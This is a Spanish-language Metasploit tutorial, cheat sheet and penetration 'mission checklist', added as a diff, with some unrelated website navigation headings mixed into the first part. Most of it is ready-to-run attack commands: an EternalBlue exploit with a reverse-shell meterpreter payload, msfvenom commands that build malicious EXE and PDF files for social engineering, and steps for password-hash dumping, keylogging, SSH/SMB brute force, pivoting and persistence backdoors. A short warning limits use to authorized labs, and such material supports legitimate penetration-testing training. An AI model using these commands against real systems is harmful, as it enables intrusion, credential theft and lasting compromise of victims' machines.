@@ -1,0 +1,460 @@
+=============================
+METASPLOIT - TUTORIAL RÁPIDO
+=============================
+
+Metasploit - Home
+-----------------
+Framework de explotación y pruebas de penetración líder. Permite descubrir, explotar y validar vulnerabilidades en sistemas y redes.
+
+Metasploit - Introduction
+-------------------------
+Herramienta de código abierto (y versión comercial) usada por pentesters, red teams y profesionales de ciberseguridad para ejecutar exploits, gestionar payloads, realizar escaneos y más.
+
+Metasploit - Environment Setup
+------------------------------
+Instalación en Kali Linux:
+    sudo apt update && sudo apt install metasploit-framework
+Iniciar consola:
+    msfconsole
+
+Metasploit - Basic Commands
+---------------------------
+    help                 → Lista de comandos disponibles
+    search <nombre>      → Buscar exploit, payload o módulo
+    use <módulo>         → Seleccionar módulo
+    show options         → Mostrar opciones configurables
+    set <opción> <valor> → Configurar opciones
+    run / exploit        → Ejecutar exploit
+    sessions             → Listar sesiones abiertas
+    sessions -i <id>     → Interactuar con sesión
+
+Metasploit - Armitage GUI
+-------------------------
+GUI gráfica para Metasploit, ideal para análisis visual y gestión de múltiples hosts.
+
+Metasploit - Pro Console
+------------------------
+Versión comercial con opciones de automatización, informes y gestión avanzada.
+
+Metasploit - Vulnerable Target
+------------------------------
+Configurar máquinas vulnerables como Metasploitable o DVWA para practicar.
+
+Metasploit - Discovery Scans
+----------------------------
+    db_nmap <objetivo>   → Escaneo con nmap integrado
+    hosts                → Lista de hosts en base de datos
+    services             → Lista de servicios detectados
+
+Metasploit - Task Chains
+------------------------
+Encadenar acciones: descubrimiento → escaneo → explotación → post-explotación.
+
+Metasploit - Import Data
+------------------------
+    db_import <archivo.xml> → Importar datos de nmap, Nessus, etc.
+
+Metasploit - Vulnerability Scan
+-------------------------------
+    use auxiliary/scanner/...
+    set RHOSTS <objetivo>
+    run
+
+Metasploit - Vulnerability Validation
+-------------------------------------
+Confirmar vulnerabilidad antes de explotarla mediante módulos de validación.
+
+Metasploit - Exploit
+--------------------
+    search exploit/<servicio>
+    use exploit/<ruta>
+    set RHOSTS <ip>
+    set PAYLOAD <payload>
+    run
+
+Metasploit - Payload
+--------------------
+Tipos:
+    reverse_tcp  → Conexión inversa
+    bind_tcp     → Escucha en la víctima
+    meterpreter  → Shell avanzada post-explotación
+
+Metasploit - Credential
+-----------------------
+Gestión de credenciales encontradas:
+    creds → Lista de credenciales
+
+Metasploit - Brute-Force Attacks
+--------------------------------
+    use auxiliary/scanner/ssh/ssh_login
+    set USERPASS_FILE <diccionario>
+    run
+
+Metasploit - Pivoting
+---------------------
+Uso de host comprometido para alcanzar redes internas:
+    meterpreter > run autoroute -s <red>
+
+Metasploit - Maintaining Access
+-------------------------------
+Instalar backdoors, crear cuentas, persistencia:
+    run persistence
+
+Metasploit - MetaModules
+------------------------
+Módulos guiados para tareas comunes, simplificando el flujo.
+
+Metasploit - Social Engineering
+-------------------------------
+Integración con SET (Social Engineering Toolkit) y envío de payloads personalizados.
+
+Metasploit - Export Data
+------------------------
+    hosts -o <archivo.csv>
+    services -o <archivo.csv>
+
+Metasploit - Reports
+--------------------
+En Metasploit Pro, generación de reportes profesionales en PDF, HTML, etc.
+
+Metasploit - Quick Guide
+------------------------
+Flujo básico:
+    1. Escanear (db_nmap)
+    2. Enumerar (services, hosts)
+    3. Seleccionar exploit (search)
+    4. Configurar opciones (set)
+    5. Ejecutar (run)
+    6. Post-explotación (meterpreter)
+
+Metasploit - Useful Resources
+-----------------------------
+- https://docs.rapid7.com/metasploit/
+- https://github.com/rapid7/metasploit-framework
+
+Metasploit - Discussion
+-----------------------
+Foros y comunidades de pentesting.
+
+Selected Reading
+----------------
+Guías de seguridad ofensiva y manuales de Red Team.
+
+UPSC IAS Exams Notes
+--------------------
+No aplicable a ciberseguridad.
+
+Developer's Best Practices
+--------------------------
+Uso ético, entornos controlados, permisos previos.
+
+Questions and Answers
+---------------------
+FAQ en la documentación oficial.
+
+Effective Resume Writing
+------------------------
+Enfocar en logros técnicos y experiencia real.
+
+AI Based Resume Builder
+-----------------------
+Herramientas IA para mejorar CV.
+
+Personal AI Study Assistant
+---------------------------
+Uso de IA para planificar entrenamientos técnicos.
+
+Generate Coding Logic
+---------------------
+Automatización de tareas repetitivas con scripts.
+
+HR Interview Questions
+----------------------
+Preguntas comunes en entrevistas técnicas.
+
+Computer Glossary
+-----------------
+Glosario de términos de ciberseguridad.
+
+Who is Who
+----------
+Expertos y referentes en seguridad informática.
+
+==========================================
+METASPLOIT - CHEAT SHEET DE COMBATE
+==========================================
+
+⚠ AVISO:
+Usar solo en entornos controlados y con autorización.
+El uso no autorizado puede ser ilegal.
+
+==========================================
+1. INTRODUCCIÓN
+==========================================
+Metasploit es un framework para pruebas de penetración, explotación de vulnerabilidades y post-explotación. 
+Flujo típico: Descubrimiento → Escaneo → Enumeración → Explotación → Post-Explotación → Persistencia.
+
+Iniciar Metasploit:
+    msfconsole
+
+Actualizar:
+    msfupdate
+
+==========================================
+2. COMANDOS BÁSICOS
+==========================================
+help                     → Lista de comandos
+search <keyword>         → Buscar módulo
+use <module_path>        → Cargar módulo
+show options             → Ver parámetros
+set <option> <value>     → Configurar
+run / exploit            → Ejecutar
+back                     → Salir de módulo
+sessions                 → Listar sesiones
+sessions -i <id>         → Interactuar con sesión
+
+==========================================
+3. ESCANEO Y ENUMERACIÓN
+==========================================
+Escaneo con nmap integrado:
+    db_nmap -sV -O <IP/RANGO>
+
+Listar hosts detectados:
+    hosts
+
+Listar servicios detectados:
+    services
+
+Ejemplo:
+    db_nmap -p 21,22,80,443 192.168.1.0/24
+    hosts
+    services
+
+==========================================
+4. EXPLOTACIÓN BÁSICA
+==========================================
+Buscar exploit:
+    search exploit/windows/smb
+
+Seleccionar y configurar:
+    use exploit/windows/smb/ms17_010_eternalblue
+    set RHOSTS 192.168.1.105
+    set PAYLOAD windows/x64/meterpreter/reverse_tcp
+    set LHOST 192.168.1.100
+    run
+
+==========================================
+5. PAYLOADS
+==========================================
+Reverse TCP:
+    windows/meterpreter/reverse_tcp
+Bind TCP:
+    windows/meterpreter/bind_tcp
+
+Crear payload manual:
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
+
+==========================================
+6. POST-EXPLOTACIÓN
+==========================================
+Meterpreter:
+    sysinfo                  → Info del sistema
+    getuid                   → Usuario actual
+    hashdump                 → Dump de hashes
+    screenshot               → Captura de pantalla
+    keyscan_start            → Iniciar keylogger
+    download <archivo>       → Descargar archivo
+    upload <archivo>         → Subir archivo
+
+Pivoting (acceso a red interna):
+    run autoroute -s 10.0.0.0/24
+    use auxiliary/scanner/portscan/tcp
+    set RHOSTS 10.0.0.0/24
+    run
+
+==========================================
+7. BRUTE FORCE
+==========================================
+Ejemplo SSH:
+    use auxiliary/scanner/ssh/ssh_login
+    set RHOSTS 192.168.1.105
+    set USERPASS_FILE /path/diccionario.txt
+    run
+
+Ejemplo SMB:
+    use auxiliary/scanner/smb/smb_login
+    set RHOSTS 192.168.1.105
+    set SMBUser administrator
+    set PASS_FILE /path/passwords.txt
+    run
+
+==========================================
+8. PERSISTENCIA
+==========================================
+En Windows:
+    run persistence -U -i 10 -p 4444 -r <LHOST>
+
+En Linux:
+    upload script.sh /tmp/
+    execute -f /tmp/script.sh
+
+==========================================
+9. ATAQUES DE INGENIERÍA SOCIAL
+==========================================
+Crear ejecutable malicioso:
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > evil.exe
+
+PDF malicioso:
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f pdf > evil.pdf
+
+==========================================
+10. EXPORTAR Y REPORTAR
+==========================================
+Exportar hosts:
+    hosts -o hosts.csv
+
+Exportar servicios:
+    services -o services.csv
+
+==========================================
+11. SECUENCIA COMPLETA DE ATAQUE
+==========================================
+Ejemplo real en laboratorio:
+
+1) Escaneo:
+    db_nmap -sV -O 192.168.1.0/24
+    hosts
+    services
+
+2) Selección de objetivo:
+    search exploit/windows/smb/ms17_010_eternalblue
+    use exploit/windows/smb/ms17_010_eternalblue
+
+3) Configuración:
+    set RHOSTS 192.168.1.105
+    set PAYLOAD windows/meterpreter/reverse_tcp
+    set LHOST 192.168.1.100
+
+4) Ejecución:
+    run
+
+5) Post-explotación:
+    sessions
+    sessions -i 1
+    sysinfo
+    hashdump
+    run autoroute -s 10.0.0.0/24
+
+6) Persistencia:
+    run persistence -U -i 10 -p 4444 -r 192.168.1.100
+
+==========================================
+12. RECURSOS ÚTILES
+==========================================
+Documentación oficial:
+    https://docs.rapid7.com/metasploit/
+Repositorio GitHub:
+    https://github.com/rapid7/metasploit-framework
+Cheat Sheet oficial:
+    https://www.offensive-security.com/metasploit-unleashed/
+
+==========================================
+FIN
+==========================================
+
+==========================================
+METASPLOIT - CHECKLIST DE MISIÓN
+==========================================
+
+1. INICIO
+---------
+msfconsole
+msfupdate
+
+2. ESCANEO INICIAL
+------------------
+db_nmap -sV -O <IP/RANGO>
+hosts
+services
+
+3. ENUMERACIÓN AVANZADA
+-----------------------
+search type:auxiliary name:scanner
+use <módulo_scanner>
+set RHOSTS <objetivo>
+run
+
+4. SELECCIÓN DE EXPLOIT
+-----------------------
+search <servicio/vuln>
+use <exploit_path>
+show options
+set RHOSTS <IP_OBJ>
+set LHOST <TU_IP>
+set PAYLOAD <payload>
+run
+
+5. SESIONES
+-----------
+sessions
+sessions -i <id>
+
+6. POST-EXPLOTACIÓN
+-------------------
+sysinfo
+getuid
+hashdump
+screenshot
+keyscan_start
+download <file>
+upload <file>
+
+7. PIVOTING
+-----------
+run autoroute -s <subred>
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <subred>
+run
+
+8. BRUTE FORCE
+--------------
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS <IP_OBJ>
+set USERPASS_FILE <diccionario>
+run
+
+9. PERSISTENCIA
+---------------
+Windows:
+run persistence -U -i 10 -p <puerto> -r <LHOST>
+Linux:
+upload script.sh /tmp/
+execute -f /tmp/script.sh
+
+10. INGENIERÍA SOCIAL
+---------------------
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<puerto> -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<puerto> -f pdf > shell.pdf
+
+11. EXPORTAR DATOS
+------------------
+hosts -o hosts.csv
+services -o services.csv
+
+12. SECUENCIA EXPRESS
+---------------------
+db_nmap -sV -O <RANGO>
+search exploit/<objetivo>
+use exploit/<ruta>
+set RHOSTS <IP_OBJ>
+set LHOST <TU_IP>
+set PAYLOAD <payload>
+run
+sessions
+sessions -i 1
+hashdump
+run persistence -U -i 10 -p <puerto> -r <LHOST>
+
+13. SALIDA
+----------
+exit
